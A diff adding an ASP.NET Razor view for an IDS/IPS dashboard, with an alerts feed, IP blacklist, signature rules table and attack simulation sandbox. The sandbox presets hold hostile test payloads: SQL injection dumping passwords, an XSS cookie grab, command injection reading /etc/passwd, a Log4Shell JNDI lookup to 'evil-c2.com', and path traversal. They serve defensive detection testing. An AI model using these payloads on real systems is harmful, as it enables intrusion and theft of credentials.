@@ -1,0 +1,516 @@
+@model vulnerability_management.Models.IdsIpsSummaryViewModel
+@{
+    ViewData["Title"] = "Intrusion Detection & Prevention System (IDS/IPS)";
+    var activeTab = ViewBag.ActiveTab as string ?? "dashboard";
+    var simulationJson = TempData["SimulationResult"] as string;
+    vulnerability_management.Models.IdsIpsEvent? simResult = null;
+    if (!string.IsNullOrWhiteSpace(simulationJson))
+    {
+        try { simResult = System.Text.Json.JsonSerializer.Deserialize<vulnerability_management.Models.IdsIpsEvent>(simulationJson); } catch { }
+    }
+}
+
+<div class="top-navbar">
+    <div>
+        <div class="d-flex align-items-center gap-2 mb-1">
+            <a href="@Url.Action("Index", "Dashboard")" class="text-muted text-decoration-none small">&larr; Back to Dashboard</a>
+            <span class="text-muted">/</span>
+            <span class="text-white small">Network Boundary</span>
+        </div>
+        <h3 class="fw-bold mb-0 text-white"><i class="fa-solid fa-tower-broadcast text-danger me-2"></i>Intrusion Detection & Prevention System (IDS / IPS)</h3>
+    </div>
+    <div class="d-flex align-items-center gap-3">
+        <!-- Mode Switcher -->
+        <form method="post" action="@Url.Action("SetMode", "IdsIps")" class="d-flex align-items-center gap-2 m-0">
+            @Html.AntiForgeryToken()
+            <span class="text-muted small">Mode:</span>
+            <select name="mode" class="form-select form-select-sm form-control-vg" onchange="this.form.submit()" style="width: auto;">
+                <!option value="1" @(Model.Mode == vulnerability_management.Models.IdsIpsMode.IPS_ActivePrevention ? "selected" : "")>🛡️ IPS (Active Prevention & Drop)</!option>
+                <!option value="0" @(Model.Mode == vulnerability_management.Models.IdsIpsMode.IDS_DetectionOnly ? "selected" : "")>👁️ IDS (Detection & Alert Only)</!option>
+            </select>
+        </form>
+    </div>
+</div>
+
+@if (TempData["SuccessMessage"] != null)
+{
+    <div class="alert alert-success alert-dismissible fade show mb-4 bg-dark border-success text-success" role="alert">
+        <i class="fa-solid fa-check-circle me-2"></i> @TempData["SuccessMessage"]
+        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="alert" aria-label="Close"></button>
+    </div>
+}
+
+<!-- Top KPI Summary Cards -->
+<div class="row g-3 mb-4">
+    <div class="col-md-3">
+        <div class="kpi-card">
+            <div class="kpi-title">Inspected Requests</div>
+            <div class="kpi-value text-white">@Model.TotalInspected.ToString("N0")</div>
+            <div class="small text-muted mt-2">
+                <i class="fa-solid fa-radar me-1 text-info"></i> Real-time Deep Packet Inspection
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="kpi-card">
+            <div class="kpi-title">Threats Blocked (IPS)</div>
+            <div class="kpi-value text-danger">@Model.TotalBlocks.ToString("N0")</div>
+            <div class="small text-muted mt-2">
+                <i class="fa-solid fa-shield-virus me-1 text-danger"></i> Automatic Drop & 403 Response
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="kpi-card">
+            <div class="kpi-title">Active IP Blacklist</div>
+            <div class="kpi-value text-warning">@Model.ActiveBansCount</div>
+            <div class="small text-muted mt-2">
+                <i class="fa-solid fa-ban me-1 text-warning"></i> Dynamic Attacker Isolation
+            </div>
+        </div>
+    </div>
+    <div class="col-md-3">
+        <div class="kpi-card">
+            <div class="kpi-title">Active Engine State</div>
+            <div class="kpi-value fs-4 text-@(Model.Mode == vulnerability_management.Models.IdsIpsMode.IPS_ActivePrevention ? "success" : "info")">
+                @(Model.Mode == vulnerability_management.Models.IdsIpsMode.IPS_ActivePrevention ? "IPS ENFORCING" : "IDS MONITORING")
+            </div>
+            <div class="small text-muted mt-2">
+                <i class="fa-solid fa-bolt me-1 text-warning"></i> @Model.Rules.Count(r => r.IsEnabled) Signature SIDs Active
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Navigation Tabs -->
+<ul class="nav nav-pills mb-4 gap-2" role="tablist">
+    <li class="nav-item">
+        <button class="btn @(activeTab == "dashboard" || activeTab == "alerts" ? "btn-vg-primary" : "btn-vg-secondary")" id="alerts-tab" data-bs-toggle="pill" data-bs-target="#alerts-pane" type="button">
+            <i class="fa-solid fa-triangle-exclamation me-2"></i> Live Intrusion Alerts Feed (@Model.RecentEvents.Count)
+        </button>
+    </li>
+    <li class="nav-item">
+        <button class="btn @(activeTab == "sandbox" ? "btn-vg-primary" : "btn-vg-secondary")" id="sandbox-tab" data-bs-toggle="pill" data-bs-target="#sandbox-pane" type="button">
+            <i class="fa-solid fa-vial-virus me-2"></i> Attack Simulation Sandbox
+        </button>
+    </li>
+    <li class="nav-item">
+        <button class="btn @(activeTab == "bans" ? "btn-vg-primary" : "btn-vg-secondary")" id="bans-tab" data-bs-toggle="pill" data-bs-target="#bans-pane" type="button">
+            <i class="fa-solid fa-ban me-2"></i> Dynamic IP Blacklist (@Model.BannedIps.Count)
+        </button>
+    </li>
+    <li class="nav-item">
+        <button class="btn @(activeTab == "rules" ? "btn-vg-primary" : "btn-vg-secondary")" id="rules-tab" data-bs-toggle="pill" data-bs-target="#rules-pane" type="button">
+            <i class="fa-solid fa-sliders me-2"></i> Signature Rules Manager (@Model.Rules.Count)
+        </button>
+    </li>
+</ul>
+
+<div class="tab-content">
+    <!-- ------------------------------------------------------------- -->
+    <!-- TAB 1: LIVE INTRUSION ALERTS FEED                             -->
+    <!-- ------------------------------------------------------------- -->
+    <div class="tab-pane fade @(activeTab == "dashboard" || activeTab == "alerts" ? "show active" : "")" id="alerts-pane">
+        <div class="vg-card">
+            <div class="vg-card-header">
+                <div>
+                    <h6 class="vg-card-title text-white"><i class="fa-solid fa-list-ul text-danger"></i> Real-time Telemetry & Security Events</h6>
+                    <span class="text-muted small">Deep packet inspection audit stream</span>
+                </div>
+                <form method="post" action="@Url.Action("ClearEvents", "IdsIps")" class="m-0">
+                    @Html.AntiForgeryToken()
+                    <button type="submit" class="btn btn-vg-secondary btn-sm" onclick="return confirm('Clear all recorded IDS/IPS event logs?')">
+                        <i class="fa-solid fa-trash me-1"></i> Clear Log Feed
+                    </button>
+                </form>
+            </div>
+
+            <div class="table-responsive">
+                <table class="vg-table">
+                    <thead>
+                        <tr>
+                            <th>Timestamp & Source IP</th>
+                            <th>Target Endpoint</th>
+                            <th>Matched Rule & SID</th>
+                            <th>Severity</th>
+                            <th>Action Taken</th>
+                            <th>Payload Evidence Snippet</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        @if (!Model.RecentEvents.Any())
+                        {
+                            <tr>
+                                <td colspan="6" class="text-center py-4 text-muted">
+                                    <i class="fa-solid fa-shield-check fs-3 mb-2 d-block text-success"></i>
+                                    No intrusion attempts detected. Network boundary is clean.
+                                </td>
+                            </tr>
+                        }
+                        @foreach (var ev in Model.RecentEvents)
+                        {
+                            <tr>
+                                <td>
+                                    <div class="fw-bold text-white small mono">@ev.SourceIp</div>
+                                    <div class="text-muted" style="font-size: 0.72rem;">@ev.Timestamp.ToString("MMM dd, HH:mm:ss UTC")</div>
+                                </td>
+                                <td>
+                                    <span class="badge bg-secondary-subtle text-light mono small me-1">@ev.Method</span>
+                                    <span class="small text-light mono text-break">@ev.TargetPath</span>
+                                </td>
+                                <td>
+                                    <div class="fw-semibold text-white small">@ev.RuleName</div>
+                                    <div class="d-flex gap-1 align-items-center mt-1">
+                                        <span class="badge bg-dark border border-secondary text-info mono" style="font-size: 0.65rem;">SID @ev.MatchedSid</span>
+                                        @if (!string.IsNullOrWhiteSpace(ev.MitreAttackId))
+                                        {
+                                            <span class="badge bg-danger-subtle text-danger mono" style="font-size: 0.65rem;">MITRE @ev.MitreAttackId</span>
+                                        }
+                                    </div>
+                                </td>
+                                <td>
+                                    @if (ev.Severity == vulnerability_management.Models.AttackSeverity.Critical)
+                                    {
+                                        <span class="badge-severity-critical">CRITICAL</span>
+                                    }
+                                    else if (ev.Severity == vulnerability_management.Models.AttackSeverity.High)
+                                    {
+                                        <span class="badge-severity-high">HIGH</span>
+                                    }
+                                    else if (ev.Severity == vulnerability_management.Models.AttackSeverity.Medium)
+                                    {
+                                        <span class="badge-severity-medium">MEDIUM</span>
+                                    }
+                                    else
+                                    {
+                                        <span class="badge-severity-low">INFO</span>
+                                    }
+                                </td>
+                                <td>
+                                    @if (ev.ActionTaken == vulnerability_management.Models.IpsAction.Blocked)
+                                    {
+                                        <span class="badge bg-danger text-white"><i class="fa-solid fa-shield-xmark me-1"></i> BLOCKED (403)</span>
+                                    }
+                                    else if (ev.ActionTaken == vulnerability_management.Models.IpsAction.Dropped)
+                                    {
+                                        <span class="badge bg-dark border border-danger text-danger"><i class="fa-solid fa-ban me-1"></i> DROPPED</span>
+                                    }
+                                    else
+                                    {
+                                        <span class="badge bg-warning text-dark"><i class="fa-solid fa-triangle-exclamation me-1"></i> ALERTED</span>
+                                    }
+                                </td>
+                                <td style="max-width: 300px;">
+                                    <div class="mono small text-secondary text-break bg-dark p-1 rounded border border-secondary-subtle" style="font-size: 0.72rem;">
+                                        @ev.PayloadSnippet
+                                    </div>
+                                </td>
+                            </tr>
+                        }
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+    <!-- ------------------------------------------------------------- -->
+    <!-- TAB 2: ATTACK SIMULATION SANDBOX                              -->
+    <!-- ------------------------------------------------------------- -->
+    <div class="tab-pane fade @(activeTab == "sandbox" ? "show active" : "")" id="sandbox-pane">
+        <div class="row g-4">
+            <div class="col-lg-6">
+                <div class="vg-card">
+                    <div class="vg-card-header">
+                        <h6 class="vg-card-title"><i class="fa-solid fa-flask-vial text-warning"></i> Payload Injection & Attack Sandbox</h6>
+                    </div>
+                    <p class="text-muted small">Test and verify how the IDS/IPS engine inspects, detects, and neutralizes various attack vectors in real-time.</p>
+
+                    <!-- Preset Quick Payload Buttons -->
+                    <div class="mb-3">
+                        <label class="form-label text-muted small">Quick Test Vector Presets</label>
+                        <div class="d-flex flex-wrap gap-2">
+                            <button type="button" class="btn btn-vg-secondary btn-sm preset-btn" data-payload="' UNION SELECT null, username, password FROM users --" data-path="/api/login" data-agent="sqlmap/1.6">
+                                <i class="fa-solid fa-database text-primary me-1"></i> SQL Injection
+                            </button>
+                            <button type="button" class="btn btn-vg-secondary btn-sm preset-btn" data-payload="<script>alert(document.cookie)</script>" data-path="/search" data-agent="Mozilla/5.0">
+                                <i class="fa-solid fa-code text-warning me-1"></i> XSS Vector
+                            </button>
+                            <button type="button" class="btn btn-vg-secondary btn-sm preset-btn" data-payload="127.0.0.1; cat /etc/passwd" data-path="/tools/ping" data-agent="curl/7.68">
+                                <i class="fa-solid fa-terminal text-danger me-1"></i> Command Injection
+                            </button>
+                            <button type="button" class="btn btn-vg-secondary btn-sm preset-btn" data-payload="${jndi:ldap://evil-c2.com:1389/Exploit}" data-path="/auth" data-agent="Log4jScanner">
+                                <i class="fa-solid fa-bomb text-danger me-1"></i> Log4Shell RCE
+                            </button>
+                            <button type="button" class="btn btn-vg-secondary btn-sm preset-btn" data-payload="../../windows/win.ini" data-path="/download" data-agent="Nikto/2.1.6">
+                                <i class="fa-solid fa-folder-tree text-info me-1"></i> Path Traversal
+                            </button>
+                        </div>
+                    </div>
+
+                    <form method="post" action="@Url.Action("SimulateAttack", "IdsIps")">
+                        @Html.AntiForgeryToken()
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Target Endpoint Path</label>
+                            <input type="text" name="TargetPath" id="simPath" class="form-control form-control-vg mono" value="/api/v1/auth" required />
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Source IP Address</label>
+                            <input type="text" name="SourceIp" class="form-control form-control-vg mono" value="198.51.100.42" required />
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">User-Agent Header</label>
+                            <input type="text" name="UserAgent" id="simAgent" class="form-control form-control-vg mono" value="Mozilla/5.0 (Windows NT 10.0; Win64; x64)" />
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Attack Payload / Injection String</label>
+                            <textarea name="Payload" id="simPayload" rows="3" class="form-control form-control-vg mono" placeholder="Enter malicious query or string to simulate..." required>' UNION SELECT 1, @@version, user() --</textarea>
+                        </div>
+                        <button type="submit" class="btn btn-vg-primary w-100 py-2">
+                            <i class="fa-solid fa-play me-1"></i> Execute Attack Simulation & Inspect
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <!-- Simulation Result Output -->
+            <div class="col-lg-6">
+                @if (simResult != null)
+                {
+                    <div class="vg-card h-100 border-@(simResult.ActionTaken == vulnerability_management.Models.IpsAction.Blocked ? "danger" : "warning")">
+                        <div class="vg-card-header">
+                            <h6 class="vg-card-title text-white"><i class="fa-solid fa-microchip text-primary"></i> Simulation Engine Telemetry</h6>
+                            <span class="badge @(simResult.ActionTaken == vulnerability_management.Models.IpsAction.Blocked ? "bg-danger" : "bg-warning text-dark") fs-6">
+                                @simResult.ActionTaken.ToString().ToUpper()
+                            </span>
+                        </div>
+
+                        <div class="mb-3">
+                            <div class="text-muted small">Detection Verdict</div>
+                            <div class="fw-bold text-white fs-5 mt-1">@simResult.RuleName</div>
+                            <div class="d-flex gap-2 align-items-center mt-1">
+                                <span class="badge bg-dark border border-secondary text-info mono">SID @simResult.MatchedSid</span>
+                                <span class="badge bg-danger-subtle text-danger mono">MITRE @simResult.MitreAttackId</span>
+                                <span class="badge bg-secondary">@simResult.Category</span>
+                            </div>
+                        </div>
+
+                        <div class="mb-3">
+                            <div class="text-muted small">Triggered Payload Evidence</div>
+                            <div class="mono text-white p-2 bg-dark rounded border border-secondary-subtle small text-break">
+                                @simResult.PayloadSnippet
+                            </div>
+                        </div>
+
+                        <div class="p-3 bg-dark rounded border border-secondary-subtle small">
+                            <div class="text-info fw-bold mb-1"><i class="fa-solid fa-shield-halved me-1"></i> Mitigation Action:</div>
+                            <div class="text-secondary">
+                                Request was evaluated by the <strong>@simResult.RuleName</strong> signature.
+                                In <strong>IPS mode</strong>, incoming TCP connection was terminated with an instant <strong>HTTP 403 Forbidden</strong> response, and attacker IP <code>@simResult.SourceIp</code> was queued for dynamic blacklisting.
+                            </div>
+                        </div>
+                    </div>
+                }
+                else
+                {
+                    <div class="vg-card h-100 text-center d-flex flex-column justify-content-center p-5 text-muted">
+                        <i class="fa-solid fa-vial fs-1 mb-3 text-secondary"></i>
+                        <h5>No Simulation Executed</h5>
+                        <p class="small mb-0">Choose a preset test vector or enter a custom payload on the left to observe real-time signature matching and IPS blocking.</p>
+                    </div>
+                }
+            </div>
+        </div>
+    </div>
+
+    <!-- ------------------------------------------------------------- -->
+    <!-- TAB 3: DYNAMIC IP BLACKLIST                                   -->
+    <!-- ------------------------------------------------------------- -->
+    <div class="tab-pane fade @(activeTab == "bans" ? "show active" : "")" id="bans-pane">
+        <div class="row g-4">
+            <div class="col-lg-4">
+                <div class="vg-card">
+                    <div class="vg-card-header">
+                        <h6 class="vg-card-title"><i class="fa-solid fa-plus text-danger"></i> Manual IP Ban / Blacklist</h6>
+                    </div>
+                    <form method="post" action="@Url.Action("BanIp", "IdsIps")">
+                        @Html.AntiForgeryToken()
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Attacker IP Address</label>
+                            <input type="text" name="ip" class="form-control form-control-vg mono" placeholder="e.g. 198.51.100.22" required />
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Reason / Justification</label>
+                            <input type="text" name="reason" class="form-control form-control-vg" placeholder="e.g. Suspicious brute force scanner" required />
+                        </div>
+                        <div class="mb-3">
+                            <label class="form-label text-muted small">Ban Duration (Minutes)</label>
+                            <input type="number" name="durationMinutes" class="form-control form-control-vg" value="60" min="5" max="43200" />
+                            <div class="form-text text-muted small">0 for permanent ban.</div>
+                        </div>
+                        <button type="submit" class="btn btn-danger w-100">
+                            <i class="fa-solid fa-ban me-1"></i> Add to IPS Blacklist
+                        </button>
+                    </form>
+                </div>
+            </div>
+
+            <div class="col-lg-8">
+                <div class="vg-card">
+                    <div class="vg-card-header">
+                        <h6 class="vg-card-title text-white"><i class="fa-solid fa-shield-xmark text-danger"></i> Currently Banned Attacker IPs (@Model.BannedIps.Count)</h6>
+                    </div>
+                    <div class="table-responsive">
+                        <table class="vg-table">
+                            <thead>
+                                <tr>
+                                    <th>IP Address</th>
+                                    <th>Trigger Reason</th>
+                                    <th>Banned Timestamp</th>
+                                    <th>Expires</th>
+                                    <th>Action</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                @if (!Model.BannedIps.Any())
+                                {
+                                    <tr>
+                                        <td colspan="5" class="text-center py-4 text-muted">
+                                            No active IP bans on record.
+                                        </td>
+                                    </tr>
+                                }
+                                @foreach (var ban in Model.BannedIps)
+                                {
+                                    <tr>
+                                        <td>
+                                            <span class="mono fw-bold text-danger">@ban.IpAddress</span>
+                                        </td>
+                                        <td>
+                                            <div class="small text-white">@ban.Reason</div>
+                                            @if (ban.TriggeredSid > 0)
+                                            {
+                                                <span class="badge bg-dark border border-secondary text-info mono" style="font-size: 0.65rem;">Triggered SID @ban.TriggeredSid</span>
+                                            }
+                                        </td>
+                                        <td>
+                                            <span class="small text-muted">@ban.BannedAt.ToString("MMM dd, HH:mm")</span>
+                                        </td>
+                                        <td>
+                                            @if (ban.IsPermanent)
+                                            {
+                                                <span class="badge bg-danger">Permanent</span>
+                                            }
+                                            else
+                                            {
+                                                <span class="small text-warning">@ban.ExpiresAt?.ToString("HH:mm:ss")</span>
+                                            }
+                                        </td>
+                                        <td>
+                                            <form method="post" action="@Url.Action("UnbanIp", "IdsIps")" class="m-0">
+                                                @Html.AntiForgeryToken()
+                                                <input type="hidden" name="ip" value="@ban.IpAddress" />
+                                                <button type="submit" class="btn btn-vg-secondary btn-sm py-1 px-2 text-success" title="Remove IP Ban">
+                                                    <i class="fa-solid fa-unlock me-1"></i> Unban
+                                                </button>
+                                            </form>
+                                        </td>
+                                    </tr>
+                                }
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ------------------------------------------------------------- -->
+    <!-- TAB 4: SIGNATURE RULES MANAGER                                -->
+    <!-- ------------------------------------------------------------- -->
+    <div class="tab-pane fade @(activeTab == "rules" ? "show active" : "")" id="rules-pane">
+        <div class="vg-card">
+            <div class="vg-card-header">
+                <div>
+                    <h6 class="vg-card-title text-white"><i class="fa-solid fa-list-check text-info"></i> Intrusion Signature Database (@Model.Rules.Count Rules)</h6>
+                    <span class="text-muted small">Snort/Suricata-compatible inspection rules</span>
+                </div>
+            </div>
+
+            <div class="table-responsive">
+                <table class="vg-table">
+                    <thead>
+                        <tr>
+                            <th>SID</th>
+                            <th>Signature Name & Description</th>
+                            <th>Category</th>
+                            <th>Severity</th>
+                            <th>MITRE ATT&CK</th>
+                            <th>State</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        @foreach (var rule in Model.Rules)
+                        {
+                            <tr>
+                                <td>
+                                    <span class="mono fw-bold text-info">@rule.Sid</span>
+                                </td>
+                                <td>
+                                    <div class="fw-semibold text-white small">@rule.Name</div>
+                                    <div class="text-muted small">@rule.Description</div>
+                                    <div class="mono text-secondary mt-1" style="font-size: 0.68rem; max-width: 400px; word-break: break-all;">
+                                        <code>@rule.PatternRegex</code>
+                                    </div>
+                                </td>
+                                <td>
+                                    <span class="badge bg-secondary-subtle text-light small">@rule.Category</span>
+                                </td>
+                                <td>
+                                    @if (rule.Severity == vulnerability_management.Models.AttackSeverity.Critical)
+                                    {
+                                        <span class="badge-severity-critical">CRITICAL</span>
+                                    }
+                                    else if (rule.Severity == vulnerability_management.Models.AttackSeverity.High)
+                                    {
+                                        <span class="badge-severity-high">HIGH</span>
+                                    }
+                                    else
+                                    {
+                                        <span class="badge-severity-medium">MEDIUM</span>
+                                    }
+                                </td>
+                                <td>
+                                    <span class="mono badge bg-danger-subtle text-danger small">@rule.MitreAttackId</span>
+                                </td>
+                                <td>
+                                    <form method="post" action="@Url.Action("ToggleRule", "IdsIps")" class="m-0">
+                                        @Html.AntiForgeryToken()
+                                        <input type="hidden" name="sid" value="@rule.Sid" />
+                                        <input type="hidden" name="enabled" value="@((!rule.IsEnabled).ToString().ToLower())" />
+                                        <button type="submit" class="btn btn-sm @(rule.IsEnabled ? "btn-outline-success" : "btn-outline-secondary") py-1 px-2">
+                                            <i class="fa-solid @(rule.IsEnabled ? "fa-toggle-on" : "fa-toggle-off") me-1"></i> @(rule.IsEnabled ? "Active" : "Disabled")
+                                        </button>
+                                    </form>
+                                </td>
+                            </tr>
+                        }
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+</div>
+
+@section Scripts {
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('.preset-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.getElementById('simPayload').value = btn.getAttribute('data-payload');
+                document.getElementById('simPath').value = btn.getAttribute('data-path');
+                document.getElementById('simAgent').value = btn.getAttribute('data-agent');
+            });
+        });
+    });
+</script>
+}
